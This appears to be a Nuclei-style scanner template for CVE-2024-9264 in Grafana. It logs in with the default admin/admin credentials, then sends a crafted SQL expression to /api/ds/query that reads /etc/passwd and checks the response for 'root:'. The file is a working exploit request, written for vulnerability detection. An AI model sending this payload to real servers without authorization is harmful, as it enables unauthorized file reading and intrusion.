id: CVE-2024-9264

info:
  name: Grafana Post-Auth File Read and RCE (CVE-2024-9264)
  author: Betmen-N-Dgeng
  severity: critical
  description: |
    Grafana is vulnerable to post-authentication file read and remote code execution due to improper handling of user-supplied input.
  reference:
    - https://github.com/nollium/CVE-2024-9264
  tags: cve,cve2024,grafana,rce,file-read

requests:
  - method: POST
    path:
      - "{{BaseURL}}/login"
    headers:
      Content-Type: application/json
    body: |
      {"user":"admin","password":"admin"}
    matchers:
      - type: word
        words:
          - "Logged in"
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/api/ds/query?ds_type=__expr__&expression=true&requestId=Q101"
    headers:
      Content-Type: application/json
    body: |
      {
        "from": "1729313027261",
        "queries": [
          {
            "datasource": {
              "name": "Expression",
              "type": "__expr__",
              "uid": "__expr__"
            },
            "expression": "SELECT content FROM read_blob('/etc/passwd')",
            "hide": false,
            "refId": "B",
            "type": "sql",
            "window": ""
          }
        ],
        "to": "1729334627261"
      }
    matchers:
      - type: word
        words:
          - "root:"
        part: body
